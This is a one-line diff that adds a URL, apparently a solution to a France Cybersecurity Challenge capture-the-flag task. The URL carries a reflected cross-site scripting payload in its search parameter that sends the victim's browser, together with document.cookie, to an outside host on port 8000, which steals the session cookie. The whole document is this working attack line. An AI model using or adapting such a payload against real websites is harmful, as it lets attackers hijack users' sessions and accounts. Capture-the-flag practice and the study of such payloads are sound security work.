@@ -1,0 +1,1 @@
+http://challenges2.france-cybersecurity-challenge.fr:5001/index.php?search=<script>document.location='http://caturday-lovers.fr.nf:8000/?'+document.cookie</script>
